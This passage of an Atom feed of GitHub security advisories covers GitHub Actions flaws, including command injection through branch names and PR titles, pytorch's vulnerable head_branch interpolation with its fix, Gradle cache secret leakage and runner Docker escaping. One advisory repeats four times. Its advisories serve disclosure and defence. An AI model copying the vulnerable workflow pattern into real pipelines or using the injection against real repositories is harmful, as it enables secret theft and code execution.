<p>This vulnerability can be triggered by any user on GitHub on any workflow using the action on pull requests. They just need to create a pull request with a branch name, which can contain the attack payload. (Note that first-time PR requests will not be run - but the attacker can submit a valid PR before submitting an invalid PR).  This can be used to execute code on the GitHub runners (potentially use it for crypto-mining, and waste your resources) and to exfiltrate any secrets you use in the CI pipeline.</p>
<h3 id="patches">Patches</h3>
<blockquote>
<p>Pass the variable as an environment variable and then use the environment variable instead of substituting it directly.</p>
</blockquote>
<p>Patched action is available on tag <strong>v4</strong>, tag <strong>v4.4.1</strong>, and any tag beyond.</p>
<h3 id="workarounds">Workarounds</h3>
<p>No workaround is available if impacted, please upgrade the version</p>
<blockquote>
<p>ℹ️ <strong>v3</strong> and <strong>v4</strong> are compatibles.</p>
</blockquote>
<h3 id="references">References</h3>
<p><a href="https://securitylab.github.com/research/github-actions-untrusted-input/">Here</a> is a set of blog posts by Github's security team explaining this issue.</p>
<h3 id="thanks">Thanks</h3>
<p>Thanks to the team of researchers from Purdue University, who are working on finding vulnerabilities in CI/CD configurations of open-source software. Their tool detected this security vulnerability.</p>
<h3 id="references-1">References</h3>
<ul>
<li><a href="https://github.com/rlespinasse/github-slug-action/security/advisories/GHSA-6q4m-7476-932w">https://github.com/rlespinasse/github-slug-action/security/advisories/GHSA-6q4m-7476-932w</a></li>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2023-27581">https://nvd.nist.gov/vuln/detail/CVE-2023-27581</a></li>
<li><a href="https://github.com/rlespinasse/github-slug-action/commit/102b1a064a9b145e56556e22b18b19c624538d94">https://github.com/rlespinasse/github-slug-action/commit/102b1a064a9b145e56556e22b18b19c624538d94</a></li>
<li><a href="https://github.com/rlespinasse/github-slug-action/releases/tag/v4.4.1">https://github.com/rlespinasse/github-slug-action/releases/tag/v4.4.1</a></li>
<li><a href="https://securitylab.github.com/research/github-actions-untrusted-input/">https://securitylab.github.com/research/github-actions-untrusted-input/</a></li>
<li><a href="https://github.com/advisories/GHSA-6q4m-7476-932w">https://github.com/advisories/GHSA-6q4m-7476-932w</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-6q4m-7476-932w</uri>
        </author>
        <category label="severity" term="HIGH"/>
        <published>2023-03-13T20:43:33.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[https://github.com/pytorch/pytorch/.github/actions/filter-test-configs] Actions expression injection in `filter-test-configs` (`GHSL-2023-181`)]]></title>
        <id>https://github.com/advisories/GHSA-hw6r-g8gj-2987</id>
        <link href="https://github.com/advisories/GHSA-hw6r-g8gj-2987"/>
        <updated>2023-08-30T20:47:26.000Z</updated>
        <content type="html"><![CDATA[<p>The <code>pytorch/pytorch</code> <code>filter-test-configs</code> workflow is vulnerable to an expression injection in Actions, allowing an attacker to potentially leak secrets and alter the repository using the workflow.</p>
<h3 id="details">Details</h3>
<p>The <a href="https://github.com/pytorch/pytorch/blob/ec26947c586dd323d741da80008403664c533f65/.github/actions/filter-test-configs/action.yml"><code>filter-test-configs</code></a> workflow is using the raw <code>github.event.workflow_run.head_branch</code> value inside the <code>filter</code> step:</p>
<pre><code class="language-yaml">- name: Select all requested test configurations
  shell: bash
  env:
    GITHUB_TOKEN: ${{ inputs.github-token }}
    JOB_NAME: ${{ steps.get-job-name.outputs.job-name }}
  id: filter
  run: |
    ...
    python3 "${GITHUB_ACTION_PATH}/../../scripts/filter_test_configs.py" \
      ...
      --branch "${{ github.event.workflow_run.head_branch }}"
</code></pre>
<p>In the event of a repository using <code>filter-test-configs</code> in a <code>pull_request_target</code>-triggered workflow, an attacker could use a malicious branch name to gain command execution in the step and potentially leak secrets.</p>
<pre><code class="language-yml">name: Example

on: pull_request_target

jobs:
  example:
    runs-on: ubuntu-latest
    steps:
      - name: Filter
        uses: pytorch/pytorch/.github/actions/filter-test-configs@v2
</code></pre>
<h4 id="impact">Impact</h4>
<p>This issue may lead to stealing workflow secrets.</p>
<h4 id="remediation">Remediation</h4>
<ol>
<li>Use an intermediate environment variable for potentially attacker-controlled values such as <code>github.event.workflow_run.head_branch</code>:</li>
</ol>
<pre><code class="language-yaml">- name: Select all requested test configurations
  shell: bash
  env:
    GITHUB_TOKEN: ${{ inputs.github-token }}
    JOB_NAME: ${{ steps.get-job-name.outputs.job-name }}
    HEAD_BRANCH: ${{ github.event.workflow_run.head_branch }}
  id: filter
  run: |
    ...
    python3 "${GITHUB_ACTION_PATH}/../../scripts/filter_test_configs.py" \
      ...
      --branch "$HEAD_BRANCH"
</code></pre>
<h4 id="resources">Resources</h4>
<ul>
<li><a href="https://codeql.github.com/codeql-query-help/javascript/js-actions-command-injection/">CodeQL for JavaScript - Expression injection in Actions</a></li>
<li><a href="https://securitylab.github.com/research/github-actions-untrusted-input/">Keeping your GitHub Actions and workflows secure Part 2: Untrusted input</a></li>
<li><a href="https://securitylab.github.com/research/github-actions-preventing-pwn-requests/">Keeping your GitHub Actions and workflows secure Part 1: Preventing pwn requests</a></li>
</ul>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/pytorch/pytorch/security/advisories/GHSA-hw6r-g8gj-2987">https://github.com/pytorch/pytorch/security/advisories/GHSA-hw6r-g8gj-2987</a></li>
<li><a href="https://github.com/advisories/GHSA-hw6r-g8gj-2987">https://github.com/advisories/GHSA-hw6r-g8gj-2987</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-hw6r-g8gj-2987</uri>
        </author>
        <category label="severity" term="MODERATE"/>
        <published>2023-08-30T20:47:13.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[gradle/gradle-build-action] Data written to GitHub Actions Cache may expose secrets]]></title>
        <id>https://github.com/advisories/GHSA-h3qr-39j9-4r5v</id>
        <link href="https://github.com/advisories/GHSA-h3qr-39j9-4r5v"/>
        <updated>2023-11-07T05:05:20.000Z</updated>
        <content type="html"><![CDATA[<h3 id="impact">Impact</h3>
<p>This vulnerability impacts GitHub workflows using the <a href="https://github.com/marketplace/actions/gradle-build-action">Gradle Build Action</a> that have executed the Gradle Build Tool with the <a href="https://docs.gradle.org/current/userguide/configuration_cache.html">configuration cache</a> enabled, potentially exposing secrets configured for the repository.</p>
<p>Secrets configured for GitHub Actions are normally passed to the Gradle Build Tool via environment variables. Due to the way that the Gradle Build Tool records these environment variables, they may be persisted into an entry in the GitHub Actions cache. This data stored in the GitHub Actions cache can be read by a GitHub Actions workflow running in an untrusted context, such as that running for a Pull Request submitted by a developer via a repository fork.</p>
<p>This vulnerability was discovered internally through code review, and we have not seen any evidence of it being exploited in the wild. However, in addition to upgrading the Gradle Build Action, you should delete any potentially vulnerable cache entries and may choose to rotate any potentially affected secrets (<a href="#Remediation">see Remediation</a>).</p>
<h3 id="patches">Patches</h3>
<p><a href="https://github.com/gradle/gradle-build-action/releases/tag/v2.4.2">Gradle Build Action v2.4.2</a> (and newer) no longer save this sensitive data for later use, preventing ongoing leakage of secrets via the GitHub Actions Cache. We strongly recommend that all users of the Gradle Build Action upgrade to <code>v2.4.2</code> (or simply <code>v2</code>) immediately.</p>
<h3 id="remediation">Remediation</h3>
<p>While upgrading to the latest version of the Gradle Build Action will prevent leakage of secrets going forward, additional actions may be required due to current or previous GitHub Actions Cache entries containing this information.</p>
<p>Current cache entries will remain vulnerable until they are forcibly deleted or they expire naturally after 7 days of not being used. Potentially vulnerable entries can be easily identified in the GitHub UI by searching for a cache entry with key matching <code>configuration-cache-*</code>. We recommend that users of the Gradle Build Action inspect their list of cache entries and <a href="https://docs.github.com/en/actions/using-workflows/caching-dependencies-to-speed-up-workflows#deleting-cache-entries">manually delete any that match this pattern</a>.</p>
<p>While we have not seen any evidence of this vulnerability being exploited, we recommend cycling any repository secrets if you cannot be certain that these have not been compromised. Compromise could occur if you run a GitHub Actions workflow for a pull request attempting to exploit this data. 
Warning signs to look for in a pull request include:</p>
<ul>
<li>Making changes to GitHub Actions workflow files in a way that may attempt to read/extract data from the Gradle User Home or /.gradle directories.</li>
<li>Making changes to Gradle build files or other executable files that may be invoked by a GitHub Actions workflow, in a way that may attempt to read/extract information from these locations.</li>
</ul>
<h3 id="workarounds">Workarounds</h3>
<p>We strongly recommend that all users upgrade to the latest version of the Gradle Build Action as soon as possible, and delete any potentially vulnerable cache entries from the GitHub Actions cache (<a href="#Remediation">see Remediation</a>). </p>
<p>If for some reason this is not possible, users can limit the impact of this vulnerability:</p>
<ul>
<li>If the Gradle project does not opt-in to using the configuration cache, then it is not vulnerable. </li>
<li>If the Gradle project does opt-in to using the configuration-cache by default, then the <code>--no-configuration-cache</code> command-line argument can be used to disable this feature in a GitHub Actions workflow.</li>
</ul>
<p>In any case, we recommend that users carefully inspect any pull request before approving the execution of GitHub Actions workflows. It may be prudent to require approval for all PRs from external contributors, as described <a href="https://docs.github.com/en/repositories/managing-your-repositorys-settings-and-features/enabling-features-for-your-repository/managing-github-actions-settings-for-a-repository#controlling-changes-from-forks-to-workflows-in-public-repositories">here</a>.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/gradle/gradle-build-action/security/advisories/GHSA-h3qr-39j9-4r5v">https://github.com/gradle/gradle-build-action/security/advisories/GHSA-h3qr-39j9-4r5v</a></li>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2023-30853">https://nvd.nist.gov/vuln/detail/CVE-2023-30853</a></li>
<li><a href="https://github.com/gradle/gradle-build-action/releases/tag/v2.4.2">https://github.com/gradle/gradle-build-action/releases/tag/v2.4.2</a></li>
<li><a href="https://github.com/advisories/GHSA-h3qr-39j9-4r5v">https://github.com/advisories/GHSA-h3qr-39j9-4r5v</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-h3qr-39j9-4r5v</uri>
        </author>
        <category label="severity" term="HIGH"/>
        <published>2023-05-01T13:42:44.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[embano1/wip] Arbitrary command injection in embano1/wip ]]></title>
        <id>https://github.com/advisories/GHSA-rg3q-prf8-qxmp</id>
        <link href="https://github.com/advisories/GHSA-rg3q-prf8-qxmp"/>
        <updated>2023-11-10T05:01:42.000Z</updated>
        <content type="html"><![CDATA[<h2 id="summary">Summary</h2>
<p>The  <code>embano1/wip</code> action uses the <code>github.event.pull_request.title</code> parameter in an insecure way. The title parameter is used in a run statement - resulting in a command injection vulnerability due to string interpolation.</p>
<h2 id="details-and-impact">Details and Impact</h2>
<p>This vulnerability can be triggered by any user on GitHub. They just need to create a pull request with a commit message containing an exploit. (Note that first-time PR requests will not be run - but the attacker can submit a valid PR before submitting an invalid PR). The commit can be genuine, but the commit message can be malicious. </p>
<p>This can be used to execute code on the GitHub runners (potentially use it for crypto-mining, and waste your resources) and can be used to exfiltrate any secrets that you use in the CI pipeline (including repository tokens). <a href="https://securitylab.github.com/research/github-actions-untrusted-input/">Here</a> is a set of blog posts by Github's security team explaining this issue.</p>
<h2 id="how-to-update-existing-workflows">How to update existing workflows</h2>
<p>Replace the following line in your workflow using this action with the <code>v2</code> branch name or commit pointing to this branch:</p>
<pre><code class="language-yaml">    uses: embano1/wip@v2
</code></pre>
<p>Or using the exact commit:</p>
<pre><code class="language-yaml">    uses: embano1/wip@c25450f77ed02c20d00b76ee3b33ff43838739a2 # v2
</code></pre>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/embano1/wip/security/advisories/GHSA-rg3q-prf8-qxmp">https://github.com/embano1/wip/security/advisories/GHSA-rg3q-prf8-qxmp</a></li>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2023-30623">https://nvd.nist.gov/vuln/detail/CVE-2023-30623</a></li>
<li><a href="https://github.com/embano1/wip/commit/c25450f77ed02c20d00b76ee3b33ff43838739a2">https://github.com/embano1/wip/commit/c25450f77ed02c20d00b76ee3b33ff43838739a2</a></li>
<li><a href="https://securitylab.github.com/research/github-actions-untrusted-input/">https://securitylab.github.com/research/github-actions-untrusted-input/</a></li>
<li><a href="https://github.com/advisories/GHSA-rg3q-prf8-qxmp">https://github.com/advisories/GHSA-rg3q-prf8-qxmp</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-rg3q-prf8-qxmp</uri>
        </author>
        <category label="severity" term="HIGH"/>
        <published>2023-04-24T22:32:32.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[Azure/setup-kubectl] Azure/setup-kubectl: Escalation of privilege vulnerability for v3 and lower]]></title>
        <id>https://github.com/advisories/GHSA-p756-rfxh-x63h</id>
        <link href="https://github.com/advisories/GHSA-p756-rfxh-x63h"/>
        <updated>2023-03-07T20:07:27.000Z</updated>
        <content type="html"><![CDATA[<h3 id="impact">Impact</h3>
<p>This vulnerability only impacts versions <code>v2</code> and lower. An insecure temporary creation of a file allows other actors on the Actions runner to replace the Kubectl binary created by this action because it is world writable. This Kubectl tool installer runs <code>fs.chmodSync(kubectlPath, 777)</code> to set permissions on the Kubectl binary, however, this allows any local user to replace the Kubectl binary. This allows privilege escalation to the user that can also run kubectl, most likely root. This attack is only possible if an attacker somehow breached the GitHub actions runner or if a user is utilizing an Action that maliciously executes this attack.</p>
<p>No impacted customers have been reported.</p>
<h3 id="patches">Patches</h3>
<p>This has been fixed and released in all versions <code>v3</code> and later. 755 permissions are used instead.</p>
<h3 id="workarounds">Workarounds</h3>
<p>If users absolutely cannot upgrade to <code>v3</code> or higher than they should be extra diligent of the other GitHub actions they are using in a workflow and ensure that their GitHub actions runner is secure.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/Azure/setup-kubectl/security/advisories/GHSA-p756-rfxh-x63h">https://github.com/Azure/setup-kubectl/security/advisories/GHSA-p756-rfxh-x63h</a></li>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2023-23939">https://nvd.nist.gov/vuln/detail/CVE-2023-23939</a></li>
<li><a href="https://github.com/Azure/setup-kubectl/commit/d449d75495d2b9d1463555bb00ca3dca77a42ab6">https://github.com/Azure/setup-kubectl/commit/d449d75495d2b9d1463555bb00ca3dca77a42ab6</a></li>
<li><a href="https://github.com/advisories/GHSA-p756-rfxh-x63h">https://github.com/advisories/GHSA-p756-rfxh-x63h</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-p756-rfxh-x63h</uri>
        </author>
        <category label="severity" term="LOW"/>
        <published>2023-03-07T20:07:27.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[actions/runner] Docker Command Escaping in the GitHub Actions Runner]]></title>
        <id>https://github.com/advisories/GHSA-2c6m-6gqh-6qg3</id>
        <link href="https://github.com/advisories/GHSA-2c6m-6gqh-6qg3"/>
        <updated>2023-01-30T05:02:47.000Z</updated>
        <content type="html"><![CDATA[<h3 id="impact">Impact</h3>
<p>The actions runner invokes the docker cli directly in order to run job containers, service containers, or container actions. A bug in the logic for how the environment is encoded into these docker commands was discovered that allows an input to escape the environment variable and modify that docker command invocation directly. Jobs that use <a href="https://docs.github.com/en/actions/creating-actions/creating-a-docker-container-action">container actions</a>, <a href="https://docs.github.com/en/actions/using-jobs/running-jobs-in-a-container">job containers</a>, or <a href="https://docs.github.com/en/actions/using-containerized-services/about-service-containers">service containers</a> alongside untrusted user inputs in environment variables may be vulnerable.</p>
<h3 id="patches">Patches</h3>
<p>The Actions Runner has been patched, both on <code>github.com</code> and hotfixes for GHES and GHAE customers. Please update to one of the following versions of the runner:</p>
<ul>
<li>2.296.2</li>
<li>2.293.1</li>
<li>2.289.4</li>
<li>2.285.2</li>
<li>2.283.4</li>
</ul>
<p>GHES and GHAE customers may want to patch their instance in order to have their runners automatically upgrade to these new runner versions.</p>
<h3 id="workarounds">Workarounds</h3>
<p>You may want to consider removing any container actions, job containers, or service containers from your jobs until you are able to upgrade your runner versions.</p>
<h3 id="for-more-information">For more information</h3>
<p>If you have any questions or comments about this advisory:</p>
<ul>
<li>Open an issue in <a href="https://github.com/actions/runner">the actions runner</a></li>
</ul>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/actions/runner/security/advisories/GHSA-2c6m-6gqh-6qg3">https://github.com/actions/runner/security/advisories/GHSA-2c6m-6gqh-6qg3</a></li>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2022-39321">https://nvd.nist.gov/vuln/detail/CVE-2022-39321</a></li>
<li><a href="https://github.com/actions/runner/pull/2107">https://github.com/actions/runner/pull/2107</a></li>
<li><a href="https://github.com/actions/runner/pull/2108">https://github.com/actions/runner/pull/2108</a></li>
<li><a href="https://github.com/advisories/GHSA-2c6m-6gqh-6qg3">https://github.com/advisories/GHSA-2c6m-6gqh-6qg3</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-2c6m-6gqh-6qg3</uri>
        </author>
        <category label="severity" term="HIGH"/>
        <published>2022-10-25T19:54:27.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[actions/runner] Docker Command Escaping in the GitHub Actions Runner]]></title>
        <id>https://github.com/advisories/GHSA-2c6m-6gqh-6qg3</id>
        <link href="https://github.com/advisories/GHSA-2c6m-6gqh-6qg3"/>
        <updated>2023-01-30T05:02:47.000Z</updated>
        <content type="html"><![CDATA[<h3 id="impact">Impact</h3>
<p>The actions runner invokes the docker cli directly in order to run job containers, service containers, or container actions. A bug in the logic for how the environment is encoded into these docker commands was discovered that allows an input to escape the environment variable and modify that docker command invocation directly. Jobs that use <a href="https://docs.github.com/en/actions/creating-actions/creating-a-docker-container-action">container actions</a>, <a href="https://docs.github.com/en/actions/using-jobs/running-jobs-in-a-container">job containers</a>, or <a href="https://docs.github.com/en/actions/using-containerized-services/about-service-containers">service containers</a> alongside untrusted user inputs in environment variables may be vulnerable.</p>
<h3 id="patches">Patches</h3>
<p>The Actions Runner has been patched, both on <code>github.com</code> and hotfixes for GHES and GHAE customers. Please update to one of the following versions of the runner:</p>
<ul>
<li>2.296.2</li>
<li>2.293.1</li>
<li>2.289.4</li>
<li>2.285.2</li>
<li>2.283.4</li>
</ul>
<p>GHES and GHAE customers may want to patch their instance in order to have their runners automatically upgrade to these new runner versions.</p>
<h3 id="workarounds">Workarounds</h3>
<p>You may want to consider removing any container actions, job containers, or service containers from your jobs until you are able to upgrade your runner versions.</p>
<h3 id="for-more-information">For more information</h3>
<p>If you have any questions or comments about this advisory:</p>
<ul>
<li>Open an issue in <a href="https://github.com/actions/runner">the actions runner</a></li>
</ul>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/actions/runner/security/advisories/GHSA-2c6m-6gqh-6qg3">https://github.com/actions/runner/security/advisories/GHSA-2c6m-6gqh-6qg3</a></li>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2022-39321">https://nvd.nist.gov/vuln/detail/CVE-2022-39321</a></li>
<li><a href="https://github.com/actions/runner/pull/2107">https://github.com/actions/runner/pull/2107</a></li>
<li><a href="https://github.com/actions/runner/pull/2108">https://github.com/actions/runner/pull/2108</a></li>
<li><a href="https://github.com/advisories/GHSA-2c6m-6gqh-6qg3">https://github.com/advisories/GHSA-2c6m-6gqh-6qg3</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-2c6m-6gqh-6qg3</uri>
        </author>
        <category label="severity" term="HIGH"/>
        <published>2022-10-25T19:54:27.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[actions/runner] Docker Command Escaping in the GitHub Actions Runner]]></title>
        <id>https://github.com/advisories/GHSA-2c6m-6gqh-6qg3</id>
        <link href="https://github.com/advisories/GHSA-2c6m-6gqh-6qg3"/>
        <updated>2023-01-30T05:02:47.000Z</updated>
        <content type="html"><![CDATA[<h3 id="impact">Impact</h3>
<p>The actions runner invokes the docker cli directly in order to run job containers, service containers, or container actions. A bug in the logic for how the environment is encoded into these docker commands was discovered that allows an input to escape the environment variable and modify that docker command invocation directly. Jobs that use <a href="https://docs.github.com/en/actions/creating-actions/creating-a-docker-container-action">container actions</a>, <a href="https://docs.github.com/en/actions/using-jobs/running-jobs-in-a-container">job containers</a>, or <a href="https://docs.github.com/en/actions/using-containerized-services/about-service-containers">service containers</a> alongside untrusted user inputs in environment variables may be vulnerable.</p>
<h3 id="patches">Patches</h3>
<p>The Actions Runner has been patched, both on <code>github.com</code> and hotfixes for GHES and GHAE customers. Please update to one of the following versions of the runner:</p>
<ul>
<li>2.296.2</li>
<li>2.293.1</li>
<li>2.289.4</li>
<li>2.285.2</li>
<li>2.283.4</li>
</ul>
<p>GHES and GHAE customers may want to patch their instance in order to have their runners automatically upgrade to these new runner versions.</p>
<h3 id="workarounds">Workarounds</h3>
<p>You may want to consider removing any container actions, job containers, or service containers from your jobs until you are able to upgrade your runner versions.</p>
<h3 id="for-more-information">For more information</h3>
<p>If you have any questions or comments about this advisory:</p>
<ul>
<li>Open an issue in <a href="https://github.com/actions/runner">the actions runner</a></li>
</ul>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/actions/runner/security/advisories/GHSA-2c6m-6gqh-6qg3">https://github.com/actions/runner/security/advisories/GHSA-2c6m-6gqh-6qg3</a></li>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2022-39321">https://nvd.nist.gov/vuln/detail/CVE-2022-39321</a></li>
<li><a href="https://github.com/actions/runner/pull/2107">https://github.com/actions/runner/pull/2107</a></li>
<li><a href="https://github.com/actions/runner/pull/2108">https://github.com/actions/runner/pull/2108</a></li>
<li><a href="https://github.com/advisories/GHSA-2c6m-6gqh-6qg3">https://github.com/advisories/GHSA-2c6m-6gqh-6qg3</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-2c6m-6gqh-6qg3</uri>
        </author>
        <category label="severity" term="HIGH"/>
        <published>2022-10-25T19:54:27.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[actions/runner] Docker Command Escaping in the GitHub Actions Runner]]></title>
        <id>https://github.com/advisories/GHSA-2c6m-6gqh-6qg3</id>
        <link href="https://github.com/advisories/GHSA-2c6m-6gqh-6qg3"/>
        <updated>2023-01-30T05:02:47.000Z</updated>
        <content type="html"><![CDATA[<h3 id="impact">Impact</h3>
<p>The actions runner invokes the docker cli directly in order to run job containers, service containers, or container actions. A bug in the logic for how the environment is encoded into these docker commands was discovered that allows an input to escape the environment variable and modify that docker command invocation directly. Jobs that use <a href="https://docs.github.com/en/actions/creating-actions/creating-a-docker-container-action">container actions</a>, <a href="https://docs.github.com/en/actions/using-jobs/running-jobs-in-a-container">job containers</a>, or <a href="https://docs.github.com/en/actions/using-containerized-services/about-service-containers">service containers</a> alongside untrusted user inputs in environment variables may be vulnerable.</p>
<h3 id="patches">Patches</h3>
<p>The Actions Runner has been patched, both on <code>github.com</code> and hotfixes for GHES and GHAE customers. Please update to one of the following versions of the runner:</p>
<ul>
<li>2.296.2</li>
<li>2.293.1</li>
<li>2.289.4</li>
<li>2.285.2</li>
<li>2.283.4</li>
</ul>
<p>GHES and GHAE customers may want to patch their instance in order to have their runners automatically upgrade to these new runner versions.</p>
<h3 id="workarounds">Workarounds</h3>
<p>You may want to consider removing any container actions, job containers, or service containers from your jobs until you are able to upgrade your runner versions.</p>
<h3 id="for-more-information">For more information</h3>
<p>If you have any questions or comments about this advisory:</p>
<ul>
<li>Open an issue in <a href="https://github.com/actions/runner">the actions runner</a></li>
</ul>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/actions/runner/security/advisories/GHSA-2c6m-6gqh-6qg3">https://github.com/actions/runner/security/advisories/GHSA-2c6m-6gqh-6qg3</a></li>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2022-39321">https://nvd.nist.gov/vuln/detail/CVE-2022-39321</a></li>
<li><a href="https://github.com/actions/runner/pull/2107">https://github.com/actions/runner/pull/2107</a></li>
<li><a href="https://github.com/actions/runner/pull/2108">https://github.com/actions/runner/pull/2108</a></li>
<li><a href="https://github.com/advisories/GHSA-2c6m-6gqh-6qg3">https://github.com/advisories/GHSA-2c6m-6gqh-6qg3</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-2c6m-6gqh-6qg3</uri>
        </author>
        <category label="severity" term="HIGH"/>
        <published>2022-10-25T19:54:27.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[actions/runner] Docker Command Escaping in the GitHub Actions Runner]]></title>
        <id>https://github.com/advisories/GHSA-2c6m-6gqh-6qg3</id>
        <link href="https://github.com/advisories/GHSA-2c6m-6gqh-6qg3"/>
        <updated>2023-01-30T05:02:47.000Z</updated>
        <content type="html"><![CDATA[<h3 id="impact">Impact</h3>
<p>The actions runner invokes the docker cli directly in order to run job containers, service containers, or container actions. A bug in the logic for how the environment is encoded into these docker commands was discovered that allows an input to escape the environment variable and modify that docker command invocation directly. Jobs that use <a href="https://docs.github.com/en/actions/creating-actions/creating-a-docker-container-action">container actions</a>, <a href="https://docs.github.com/en/actions/using-jobs/running-jobs-in-a-container">job containers</a>, or <a href="https://docs.github.com/en/actions/using-containerized-services/about-service-containers">service containers</a> alongside untrusted user inputs in environment variables may be vulnerable.</p>
<h3 id="patches">Patches</h3>
<p>The Actions Runner has been patched, both on <code>github.com</code> and hotfixes for GHES and GHAE customers. Please update to one of the following versions of the runner:</p>
<ul>
<li>2.296.2</li>
<li>2.293.1</li>
<li>2.289.4</li>
<li>2.285.2</li>
<li>2.283.4</li>
</ul>
<p>GHES and GHAE customers may want to patch their instance in order to have their runners automatically upgrade to these new runner versions.</p>
<h3 id="workarounds">Workarounds</h3>
<p>You may want to consider removing any container actions, job containers, or service containers from your jobs until you are able to upgrade your runner versions.</p>
<h3 id="for-more-information">For more information</h3>
<p>If you have any questions or comments about this advisory:</p>
<ul>
<li>Open an issue in <a href="https://github.com/actions/runner">the actions runner</a></li>
</ul>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/actions/runner/security/advisories/GHSA-2c6m-6gqh-6qg3">https://github.com/actions/runner/security/advisories/GHSA-2c6m-6gqh-6qg3</a></li>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2022-39321">https://nvd.nist.gov/vuln/detail/CVE-2022-39321</a></li>
<li><a href="https://github.com/actions/runner/pull/2107">https://github.com/actions/runner/pull/2107</a></li>
<li><a href="https://github.com/actions/runner/pull/2108">https://github.com/actions/runner/pull/2108</a></li>
<li><a href="https://github.com/advisories/GHSA-2c6m-6gqh-6qg3">https://github.com/advisories/GHSA-2c6m-6gqh-6qg3</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-2c6m-6gqh-6qg3</uri>
        </author>
        <category label="severity" term="HIGH"/>
        <published>2022-10-25T19:54:27.000Z</published>
    </entry>
</feed>